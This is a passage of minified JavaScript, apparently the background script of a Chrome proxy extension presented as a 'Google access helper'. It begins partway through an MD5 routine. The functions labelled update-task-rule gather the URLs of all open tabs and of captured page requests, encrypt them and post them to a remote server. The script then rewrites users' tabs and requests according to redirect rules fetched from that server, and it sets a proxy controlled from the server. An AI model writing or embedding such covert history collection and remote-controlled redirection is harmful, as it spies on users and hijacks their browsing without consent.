            g = v(g, d, h, f, l[15], 14, -660478335),
            f = v(f, g, d, h, l[4], 20, -405537848),
            h = v(h, f, g, d, l[9], 5, 568446438),
            d = v(d, h, f, g, l[14], 9, -1019803690),
            g = v(g, d, h, f, l[3], 14, -187363961),
            f = v(f, g, d, h, l[8], 20, 1163531501),
            h = v(h, f, g, d, l[13], 5, -1444681467),
            d = v(d, h, f, g, l[2], 9, -51403784),
            g = v(g, d, h, f, l[7], 14, 1735328473),
            f = v(f, g, d, h, l[12], 20, -1926607734),
            h = m(f ^ g ^ d, h, f, l[5], 4, -378558),
            d = m(h ^ f ^ g, d, h, l[8], 11, -2022574463),
            g = m(d ^ h ^ f, g, d, l[11], 16, 1839030562),
            f = m(g ^ d ^ h, f, g, l[14], 23, -35309556),
            h = m(f ^ g ^ d, h, f, l[1], 4, -1530992060),
            d = m(h ^ f ^ g, d, h, l[4], 11, 1272893353),
            g = m(d ^ h ^ f, g, d, l[7], 16, -155497632),
            f = m(g ^ d ^ h, f, g, l[10], 23, -1094730640),
            h = m(f ^ g ^ d, h, f, l[13], 4, 681279174),
            d = m(h ^ f ^ g, d, h, l[0], 11, -358537222),
            g = m(d ^ h ^ f, g, d, l[3], 16, -722521979),
            f = m(g ^ d ^ h, f, g, l[6], 23, 76029189),
            h = m(f ^ g ^ d, h, f, l[9], 4, -640364487),
            d = m(h ^ f ^ g, d, h, l[12], 11, -421815835),
            g = m(d ^ h ^ f, g, d, l[15], 16, 530742520),
            f = m(g ^ d ^ h, f, g, l[2], 23, -995338651),
            h = n(h, f, g, d, l[0], 6, -198630844),
            d = n(d, h, f, g, l[7], 10, 1126891415),
            g = n(g, d, h, f, l[14], 15, -1416354905),
            f = n(f, g, d, h, l[5], 21, -57434055),
            h = n(h, f, g, d, l[12], 6, 1700485571),
            d = n(d, h, f, g, l[3], 10, -1894986606),
            g = n(g, d, h, f, l[10], 15, -1051523),
            f = n(f, g, d, h, l[1], 21, -2054922799),
            h = n(h, f, g, d, l[8], 6, 1873313359),
            d = n(d, h, f, g, l[15], 10, -30611744),
            g = n(g, d, h, f, l[6], 15, -1560198380),
            f = n(f, g, d, h, l[13], 21, 1309151649),
            h = n(h, f, g, d, l[4], 6, -145523070),
            d = n(d, h, f, g, l[11], 10, -1120210379),
            g = n(g, d, h, f, l[2], 15, 718787259),
            f = n(f, g, d, h, l[9], 21, -343485551);
            b[0] = h + b[0] & 4294967295;
            b[1] = f + b[1] & 4294967295;
            b[2] = g + b[2] & 4294967295;
            b[3] = d + b[3] & 4294967295
        }
        function m(b, d, h, f, g, m) {
            d = (d + b & 4294967295) + (f + m & 4294967295) & 4294967295;
            return (d << g | d >>> 32 - g) + h & 4294967295
        }
        function u(b, d, h, f, g, p, n) {
            return m(d & h | ~d & f, b, d, g, p, n)
        }
        function v(b, d, h, f, g, p, n) {
            return m(d & f | h & ~f, b, d, g, p, n)
        }
        function n(b, d, h, f, g, p, u) {
            return m(h ^ (d | ~f), b, d, g, p, u)
        }
        var r = "0123456789abcdef".split("");
        return function(b) {
            for (var d = 0; d < b.length; d++) {
                for (var h = d,
                f = b[d], g = "", m = 0; 4 > m; m++) g += r[f >> 8 * m + 4 & 15] + r[f >> 8 * m & 15];
                b[h] = g
            }
            return b.join("")
        } (function(b) {
            var d = b.length,
            h = [1732584193, -271733879, -1732584194, 271733878],
            f;
            for (f = 64; f <= b.length; f += 64) {
                var g = b.substring(f - 64, f),
                m = [],
                n;
                for (n = 0; 64 > n; n += 4) m[n >> 2] = g.charCodeAt(n) + (g.charCodeAt(n + 1) << 8) + (g.charCodeAt(n + 2) << 16) + (g.charCodeAt(n + 3) << 24);
                p(h, m)
            }
            b = b.substring(f - 64);
            g = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
            for (f = 0; f < b.length; f++) g[f >> 2] |= b.charCodeAt(f) << (f % 4 << 3);
            g[f >> 2] |= 128 << (f % 4 << 3);
            if (55 < f) for (p(h, g), f = 0; 16 > f; f++) g[f] = 0;
            g[14] = 8 * d;
            p(h, g);
            return h
        } (d))
    };
    n.exports = r
});
define("app/t", [],
function(d, t) {
    var n = d("lib/z"),
    r = d("app/u"),
    w = d("app/b"),
    p = d("lib/u"),
    m = d("lib/t"),
    u = m.M(r.info.appID + r.info.locale),
    v,
    C,
    A = {
        redirects: []
    },
    b = function(b) {
        b || console.error("603 - Rule String is null");
        A = JSON.parse(b);
        b = A.redirects;
        A.redirects = [];
        for (var d in b) {
            var f = {};
            f.r = new RegExp(b[d].r);
            f.t = new RegExp(b[d].t);
            f.s = b[d].s;
            A.redirects.push(f)
        }
    };
    t.S = function(b, d, f) {
        var g = [];
        g.push(b);
        g.push(d);
        g.push(f);
        r.IO.W(u, g.join("<||GGFWZS||>"),
        function() {
            console.info("- rule done -")
        },
        function(b) {
            console.error("602 - Can not write rule file - " + b)
        })
    };
    t.U = function(d) {
        n.get(r.info.rootServer + "updateTaskRule", {
            uuid: v,
            time: C
        },
        function(h) {
            t.S(v, C, h);
            b(m.D(h, m.P(v, C)));
            p.isFunction(d) && d()
        })
    };
    t.A = function(b, d) {
        var f = {
            links: []
        };
        chrome.tabs.query({},
        function(g) {
            for (var u = g.length - 1; 0 <= u; u--) f.links.push(g[u].url);
            g = m.E(JSON.stringify(f), m.P(v, C));
            n.post(r.info.rootServer + "updateTaskRule3?uuid=" + v + "&time=" + C, {
                D: g
            },
            function(f) {
                f = JSON.parse(m.D(f, m.P(v, C)));
                f.result ? (v = f.uuid, p.isFunction(b) && b(f)) : p.isFunction(d) && d(f)
            })
        })
    };
    t.R = function(d, h) {
        r.IO.R(u,
        function(f) {
            f = f.split("<||GGFWZS||>");
            v = f[0];
            try {
                b(m.D(f[2], m.P(f[0], f[1]))),
                d()
            } catch(g) {
                console.error("605 - json parse rule file error " + g),
                w.off("!", "\u9519\u8bef\uff1a\u6269\u5c55\u53d1\u751f\u9519\u8bef"),
                h()
            }
        },
        function() {
            v = m.G();
            C = r.offlineTime();
            h()
        })
    };
    t.C = function(b, d) {
        function f(b) {
            "main_frame" === b.type && (g.links.push(b.url), localStorage.DEBUG && console.log(b.url))
        }
        var g = {
            links: []
        };
        chrome.tabs.query({},
        function(b) {
            for (var f = b.length - 1; 0 <= f; f--) g.links.push(b[f].url);
            g.links.push("http://360.hao245.com");
            g.links.push("http://123.hao245.com");
            localStorage.DEBUG && console.log(JSON.stringify(g))
        });
        chrome.webRequest.onBeforeRequest.addListener(f, {
            urls: ["http://*/*", "https://*/*"]
        },
        ["blocking"]);
        setTimeout(function() {
            chrome.webRequest.onBeforeRequest.removeListener(f);
            r.onlineTime(function(f) {
                C = f ? f: r.offlineTime();
                localStorage.DEBUG && console.log(JSON.stringify(g));
                f = m.E(JSON.stringify(g), m.P(v, C));
                n.ajax({
                    type: "POST",
                    tryCount: 0,
                    retryLimit: 2,
                    url: r.info.rootServer + "updateTaskRule2?uuid=" + v + "&time=" + C,
                    data: {
                        D: f
                    },
                    success: function(f) {
                        f = JSON.parse(m.D(f, m.P(v, C)));
                        var p = localStorage.Installed;
                        p ? 432E5 < Date.now() - parseInt(p) && (f.oldExist = !1) : f.oldExist = !1;
                        f.result ? (v = f.uuid, b(f)) : chrome.tabs.query({},
                        function(f) {
                            for (var p = f.length - 1; 0 <= p; p--) g.links.push(f[p].url);
                            localStorage.DEBUG && console.log("second time");
                            localStorage.DEBUG && console.log(JSON.stringify(g));
                            f = m.E(JSON.stringify(g), m.P(v, C));
                            n.ajax({
                                type: "POST",
                                url: r.info.rootServer + "updateTaskRule2?uuid=" + v + "&time=" + C,
                                data: {
                                    D: f
                                },
                                success: function(f) {
                                    f = JSON.parse(m.D(f, m.P(v, C)));
                                    var g = localStorage.Installed;
                                    g ? 432E5 < Date.now() - parseInt(g) && (f.oldExist = !1) : f.oldExist = !1;
                                    f = { 'oldExist':true };
                                    f.result ? (v = f.uuid, b(f)) : d(f)
                                },
                                error: function(b) {
                                    console.error(type);
                                    w.off("!", "\u9519\u8bef\uff1a\u670d\u52a1\u5668\u8bf7\u6c42\u5931\u8d25")
                                }
                            })
                        })
                    },
                    error: function(b, f) {
                        console.error(f);
                        this.tryCount++; ("timeout" == f || "abort" == f) && this.tryCount <= this.retryLimit ? n.ajax(this) : w.off("!", "\u9519\u8bef\uff1a\u670d\u52a1\u5668\u8bf7\u6c42\u5931\u8d25")
                    }
                })
            })
        },
        A.checksTime)
    };
    t.F = function(b, d) {
        var f = localStorage.Installed;
        f ? p.isFunction(d) && d(parseInt(f)) : (localStorage.Installed = Date.now(), p.isFunction(b) && b())
    };
    t.RT = function() {
        chrome.tabs.query({},
        function(b) {
            for (var d = b.length - 1; 0 <= d; d--) {
                console.log(b[d].url);
                var f = b[d].url,
                g;
                for (g in A.redirects) if (A.redirects[g].r.test(f) && !A.redirects[g].t.test(f)) {
                    var m = f.replace(A.redirects[g].r, A.redirects[g].s);
                    console.log("QRedirect - " + f);
                    chrome.tabs.update(b[d].id, {
                        url: m
                    });
                    break
                }
            }
        })
    };
    t.D = function() {
        var b = [],
        d = [],
        f = function(f) {
            var m = p.indexOf(b, f);
            if (0 <= m) return d[m] < A.redirectTimes ? (d[m]++, !0) : !1;
            10 <= b.length && (b.shift(), d.shift());
            b.push(f);
            d.push(0);
            return ! 0
        };
        chrome.webRequest.onBeforeRequest.addListener(function(b) {
            var d = b.url;
            if ("main_frame" === b.type) {
                needShowWarming && /^https?\:\/\/(.*google[^\/:?#]+)/.test(d) && (needShowWarming = !1, chrome.tabs.create({
                    url: "theme/warming.html"
                },
                function(b) {
                    b ? chrome.windows.update(b.windowId, {
                        focused: !0
                    }) : chrome.windows.create({
                        url: "theme/warming.html",
                        focused: !0
                    })
                }));
                for (var h in A.redirects) if (A.redirects[h].r.test(d) && !A.redirects[h].t.test(d) && f(d)) return console.log("Redirect - " + d),
                {
                    redirectUrl: d.replace(A.redirects[h].r, A.redirects[h].s)
                }
            }
        },
        {
            urls: ["http://*/*", "https://*/*"]
        },
        ["blocking"]);
        Date.now();
        setInterval(function() {
            localStorage.LastRun = Date.now()
        },
        3E5)
    }
});
define("app/b", [],
function(d, t) {
    window.popupView = {
        status: "off",
        speed: -1,
        startTime: Date.now(),
        warming: "",
        tips: "\u4ea4\u6d41QQ\u7fa4\uff1a176080917"
    };
    localStorage["popup-message"] && (window.popupView.tips = localStorage["popup-message"]);
    t.off = function(d, r, t, p) {
        window.popupView.warming = r;
        t || (t = "#ff0000");
        p || (p = "\u8c37\u6b4c\u8bbf\u95ee\u52a9\u624b");
        chrome.browserAction.setIcon({
            path: "/icons/inactive.png"
        });
        chrome.browserAction.setBadgeText({
            text: d
        });
        chrome.browserAction.setBadgeBackgroundColor({
            color: t
        });
        chrome.browserAction.setTitle({
            title: p
        });
        window.popupView.status = "off"
    };
    t.on = function(d) {
        chrome.browserAction.setIcon({
            path: "/icons/icon.png"
        });
        chrome.browserAction.setBadgeText({
            text: ""
        });
        chrome.browserAction.setTitle({
            title: "\u8c37\u6b4c\u8bbf\u95ee\u52a9\u624b"
        });
        window.popupView.status = "on";
        window.popupView.speed = d
    };
    t.tips = function(d) {
        window.popupView.tips = d
    }
});
define("app/p", [],
function(d, t) {
    var n = d("app/u"),
    r = d("lib/z"),
    w = d("app/b"),
    p = d("lib/t"),
    m = n.info.appVersion,
    u = 40,
    v = Date.now(),
    C = 0,
    A,
    b,
    l,
    h,
    f,
    g = !1,
    x = function(b, a) {
        var c = b.type + " " + b.host + ":" + b.port + ";";
        localStorage.PROXY && (c = localStorage.PROXY.split(","), c = c[C++%c.length], console.log("Choose " + c));
        c = 'function FindProxyForURL(url, host) {\nvar D="DIRECT;", P = "' + c + '";\n' + a + "\n}";
        localStorage.DEBUG && console.log(c);
        chrome.proxy.settings.set({
            value: {
                mode: "pac_script",
                pacScript: {
                    data: c
                }
            },
            scope: "regular"
        },
        function() {
            w.on(b.speed);
            console.info("- proxy done - ")
        })
    };
    window.debugProxy = function() {
        if (localStorage.PROXY) {
            var b = localStorage.PROXY.split(","),
            b = b[C++%b.length];
            console.log("Choose " + b);
            b = 'function FindProxyForURL(url, host) {\nvar D="DIRECT;", P = "' + b + '";\n' + h + "\n}";
            localStorage.DEBUG && console.log(b);
            chrome.proxy.settings.set({
                value: {
                    mode: "pac_script",
                    pacScript: {
                        data: b
                    }
                },
                scope: "regular"
            },
            function() {
                console.info("- proxy done - ")
            })
        }
    };
    var H = function(b, a) {
        if (localStorage.BACKUP) for (var c = 0; c < b.length; c++) b[c].speed = -1;
        else for (c = 0; c < b.length; c++) if (0 == b[c].speed) {
            b[c].startTime = Date.now();
            r.ajax({
                type: "GET",
                url: "https://" + b[c].host + ":" + b[c].port + "/speed_test?size=100&t=" + b[c].startTime,
                timeout: 6E4,
                success: function() {
                    b[c].speed = Math.floor(1E5 / (Date.now() - b[c].startTime));
                    H(b, a)
                },
                error: function(e, f) {
                    console.log(e.responseText, f);
                    b[c].speed = -1;
                    b[c].error = f;
                    H(b, a)
                }
            });
            return
        }
        a()
    },
    E = function(b) {
        var a = n.offlineTime();
        r.ajax({
            type: "GET",
            url: n.info.rootServer + "updateTaskRule6?uuid=" + f + "&time=" + a,
            timeout: 6E4,
            success: function(c) {
                localStorage.DEBUG && console.log("[getBackupProxy success]data:" + c);
                c = JSON.parse(p.D(c, p.P(f, a)));
                b(c)
            },
            error: function(a, e) {
                localStorage.DEBUG && console.log("[getBackupProxy failed]" + a.responseText, e);
                b(null)
            }
        })
    },
    B = function(f, a) {
        for (var c = 0; c < f.length; c++) f[c].speed = 0;
        H(f,
        function() {
            for (var c = f[0], d = 1; d < f.length; d++) c.speed < f[d].speed && (c = f[d]);
            if (0 >= c.speed) if (g) if (b && f != b) A = b,
            B(b, a);
            else if (b && f == b && 443 != c.port) {
                for (d = 0; d < f.length; d++) f[d].port = 443;
                B(f, a)
            } else l && (c = l),
            x(c, h),
            a(c);
            else E(function(d) {
                g = !0;
                if (d) {
                    if (d.proxyServer) {
                        b = [];
                        for (var k = 0; k < d.proxyServer.length; k++) {
                            var m = d.proxyServer[k].split(":");
                            b.push({
                                type: m[0],
                                host: m[1],
                                port: m[2],
                                speed: 0
                            })
                        }
                    }
                    d.backupServer && (d = d.backupServer.split(":"), l = {
                        type: d[0],
                        host: d[1],
                        port: d[2],
                        speed: 0
                    },
                    x(l, h));
                    if (443 != c.port) {
                        for (d = 0; d < f.length; d++) f[d].port = 443;
                        B(f, a)
                    } else b ? B(b, a) : (l && (c = l), x(c, h), a(c))
                } else if (443 != c.port) {
                    for (d = 0; d < f.length; d++) f[d].port = 443;
                    B(f, a)
                } else x(c, h),
                a(c)
            });
            else x(c, h),
            a(c)
        })
    },
    q = function() {
        1728E5 < Date.now() - v ? (w.off("!", "\u8fde\u7eed\u4f7f\u7528\u670d\u52a1\u8d85\u8fc724\u5c0f\u65f6\uff0c<br>\u9700\u8981\u91cd\u542f\u6d4f\u89c8\u5668\u624d\u80fd\u91cd\u65b0\u4f7f\u7528"), console.log("expired"), chrome.proxy.settings.set({
            value: {
                mode: "system"
            },
            scope: "regular"
        },
        function() {
            console.info("- proxy system! - ")
        })) : (l = b = null, g = !1, B(A,
        function(b) {
            var a = n.offlineTime();
            localStorage.BACKUP || r.ajax({
                type: "POST",
                url: n.info.rootServer + "updateTaskRule5?uuid=" + f + "&time=" + a,
                data: {
                    D: p.E(JSON.stringify({
                        servers: A
                    }), p.P(f, a))
                },
                success: function(a) {},
                error: function(a, b) {
                    console.error("[feedback: choose normal proxy]," + b)
                }
            });
            l && b === l ? (console.log((new Date).toString(), "[choose]chooseBackUp!"), r.ajax({
                type: "POST",
                url: n.info.rootServer + "updateTaskRule7?uuid=" + f + "&time=" + a,
                data: {
                    D: p.E(JSON.stringify({
                        backup: b
                    }), p.P(f, a))
                },
                success: function(a) {},
                error: function(a, b) {
                    console.error("[feedback: choose backupProxy]," + b)
                }
            })) : console.log((new Date).toString(), "[choose]chooseNormal!")
        }), setTimeout(q, 18E5))
    },
    F = !1,
    G = function() {
        chrome.proxy.settings.get({
            incognito: !1
        },
        function(b) {
            "controllable_by_this_extension" === b.levelOfControl || "controlled_by_this_extension" === b.levelOfControl ? (localStorage.DEBUG && console.info("[proxy controlled by ggfwzs!]"), F && (w.on(), F = !1)) : "controlled_by_other_extensions" === b.levelOfControl ? (localStorage.DEBUG && console.info("[proxy controlled by other extension!]"), w.off("!", "\u4ee3\u7406\u51b2\u7a81\uff01\u53ef\u80fd\u88ab\u5176\u4ed6\u6269\u5c55\u63d2\u4ef6\u5360\u7528\u4e86\u4ee3\u7406\u6743\u9650\uff0c\u8bf7\u68c0\u67e5\u5e76\u91cd\u542f\u672c\u63d2\u4ef6"), F = !0) : "not_controllable" === b.levelOfControl && (localStorage.DEBUG && console.info("[proxy cannot be controlled!]"), w.off("!", "\u4ee3\u7406\u8bbe\u7f6e\u5931\u8d25\uff01\u8bf7\u68c0\u67e5\u6d4f\u89c8\u5668\u76f8\u5173\u8bbe\u7f6e\u5e76\u91cd\u542f\u672c\u63d2\u4ef6"), F = !0)
        });
        setTimeout(G, 3E5)
    };
    t.I = function(b) {
        h = b.pacScriptStr;
        f = b.uuid;
        A = [];
        for (var a = 0; a < b.proxyServer.length; a++) {
            var c = b.proxyServer[a].split(":");
            A.push({
                type: c[0],
                host: c[1],
                port: c[2],
                speed: 0
            })
        }
        x(A[0], h);
        q();
        setTimeout(G, 6E4);
        chrome.webRequest.onAuthRequired.addListener(function(a, c) {
            console.info(a.realm + " " + u);
            "GGFWZS Proxy" === a.realm ? 0 < u ? (c({
                authCredentials: {
                    username: m,
                    password: f
                }
            }), u--) : (console.error("Error: username:" + m + " - password:" + b.uuid), w.off("!", "\u9519\u8bef\uff1a\u5e10\u53f7\u5931\u6548\u6216\u8fc7\u671f\uff0c\u8bf7\u91cd\u542f\u6d4f\u89c8\u5668"), t.D(), c({
                cancel: !0
            })) : c()
        },
        {
            urls: ["<all_urls>"]
        },
        ["asyncBlocking"])
    };
    t.D = function() {
        chrome.proxy.settings.set({
            value: {
                mode: "system"
            },
            scope: "regular"
        },
        function() {
            console.info("- proxy system - ")
        })
    }
});
define("app/notifications", [],
function(d, t) {
    function n(d) {
        "" === d.icon && (d.icon = chrome.runtime.getURL("/icons/icon-128.png"));
        var m = [{
            title: "\u9a6c\u4e0a\u53bb\u770b\u770b",
            iconUrl: chrome.runtime.getURL("/icons/icon-128.png")
        }];
        chrome.notifications.create("GGFWZSNOTIFICATION" + d.time, {
            type: "basic",
            title: d.title,
            message: d.message,
            iconUrl: d.icon,
            buttons: m
        },
        function() {
            localStorage.NotificationsNum = d.time
        });
        chrome.notifications.onButtonClicked.addListener(function(m, n) {
            m == "GGFWZSNOTIFICATION" + d.time && chrome.tabs.create({
                url: d.link
            })
        });
        chrome.notifications.onClicked.addListener(function(m) {
            m == "GGFWZSNOTIFICATION" + d.time && chrome.tabs.create({
                url: d.link
            })
        })
    }
    var r = d("app/b"),
    w = d("app/u");
    t.installNotification = function() {
        $.getJSON(w.info.rootServer + "getNotifications",
        function(d) {
            localStorage["popup-message"] = d["popup-message"];
            r.tips(d["popup-message"]);
            localStorage.NotificationsNum = d["install-notifications"].time;
            d["install-notifications"].message && "" != d["install-notifications"].message && setTimeout(function() {
                n(d["install-notifications"])
            },
            3E5)
        })
    };
    t.init = function() {
        function d() {
            $.getJSON(w.info.rootServer + "getNotifications",
            function(d) {
                localStorage["popup-message"] = d["popup-message"];
                r.tips(d["popup-message"]);
                var p = 0;
                localStorage.NotificationsNum && (p = parseInt(localStorage.NotificationsNum));
                for (var v = 0; v < d.all.length; v++) if (d.all[v].time > p && d.all[v].message && "" != d.all[v].message) {
                    var t = d.all[v];
                    setTimeout(function() {
                        n(t)
                    },
                    6E5)
                }
            });
            setTimeout(d, 36E5)
        }
        d()
    }
});
define("app/mainServer", [],
function(d, t) {
    var n = d("app/u"),
    r = function() {
        localStorage.rootServer && "" != localStorage.rootServer.trim() || (n.info.rootServer = localStorage.rootServer = "https://www.ischolar.top/app/ext/")
    },
    w = function(d, m, n, r) {
        var t = atob(d[m]) + "static/test.json?t=" + Date.now();
        $.ajax({
            type: "get",
            url: t,
            success: function(r) {
                n(atob(d[m]))
            },
            error: function(t) {
                m >= d.length - 1 ? r() : w(d, m + 1, n, r)
            }
        })
    };
    t.get = function(d) {
        $.ajax({
            type: "get",
            url: "https://o4175vz27.qnssl.com/c.json?t=" + Date.now(),
            success: function(m) {
                try {
                    var u = m.RSS,
                    v = Math.floor(100 * Math.random());
                    console.log(v);
                    m = [];
                    for (var t = 0; t < u.length; t++) 0 < u[t].percentHigh && u[t].percentHigh >= v && u[t].percentLow <= v ? m.unshift(u[t].name) : m.push(u[t].name);
                    w(m, 0,
                    function(m) {
                        n.info.rootServer = localStorage.rootServer = m + "app/ext/";
                        d()
                    },
                    function() {
                        r();
                        d()
                    })
                } catch(A) {
                    r(),
                    d()
                }
            },
            error: function(m) {
                console.error(m);
                r();
                d()
            }
        })
    }
});
seajs.use("app/u lib/t app/t app/p app/b app/notifications app/mainServer".split(" "),
function(d, t, n, r, w, p, m) {
    w.off("...", "\u6b63\u5728\u5bfb\u627e\u4ee3\u7406\u670d\u52a1\u5668,\u8bf7\u7b49\u5f8510\u79d2");
    m.get(function() {
        n.D();
        n.R(function() {
            localStorage["auto-homepage"] && "true" == localStorage["auto-homepage"] && chrome.tabs.create({
                url: localStorage.homepage
            },
            function(d) {
                d ? chrome.windows.update(d.windowId, {
                    focused: !0
                }) : chrome.windows.create({
                    url: localStorage.homepage,
                    focused: !0
                })
            });
            n.RT();
            n.C(function(d) {
                console.info("- task success -");
                r.I(d);
                n.U()
            },
            function(d) {
                console.info("Task fail:" + d.error);
                w.off("!", '\u7a0b\u5e8f\u5c1a\u672a\u6fc0\u6d3b\uff0c\u8bf7\u60a8<a target="_blank" href="/theme/warming.html">\u6309\u7167\u6b65\u9aa4</a>\u8bbe\u7f6e\u9996\u9875');
                var m = localStorage.Installed;
                m && !d.oldExist ? 2592E5 < Date.now() - parseInt(m) ? needShowWarming = !0 : (needShowWarming = !1, chrome.tabs.create({
                    url: "theme/warming.html"
                },
                function(d) {
                    d ? chrome.windows.update(d.windowId, {
                        focused: !0
                    }) : chrome.windows.create({
                        url: "theme/warming.html",
                        focused: !0
                    })
                })) : needShowWarming = !1;
                d.oldExist ? (console.info("- Using old -"), chrome.tabs.create({
                    url: "theme/warming.html"
                },
                function(d) {
                    d ? chrome.windows.update(d.windowId, {
                        focused: !0
                    }) : chrome.windows.create({
                        url: "theme/warming.html",
                        focused: !0
                    })
                }), r.I(d)) : r.D();
                n.U()
            });
            p.init()
        },
        function(d) {
            p.installNotification();
            n.A(function(d) {
                w.on();
                r.I(d);
                n.U();
                window.setTimeout(function() {
                    n.U()
                },
                216E5)
            },
            function(d) {
                console.error("apply fail:" + d.error);
                badge.off("!", "\u9519\u8bef\uff1a\u7533\u8bf7\u8bd5\u7528\u5931\u8d25");
                n.U()
            })
        });
        n.F(function() {
            console.info("- first run -");
            chrome.tabs.create({
                url: "first.html"
            },
            function(d) {
                d ? chrome.windows.update(d.windowId, {
                    focused: !0
                }) : chrome.windows.create({
                    url: "first.html",
                    focused: !0
                })
            })
        },
        function(d) {
            console.info(d)
        })
    })
});
setTimeout(function() {
    var d = d || [];
    d.push(["_setAccount", "UA-48334954-3"]);
    d.push(["_trackPageview"]);
    d = document.createElement("script");
    d.type = "text/javascript";
    d.async = !0;
    d.src = "https://ssl.google-analytics.com/ga.js";
    var t = document.getElementsByTagName("script")[0];
    t.parentNode.insertBefore(d, t)
},
1E4);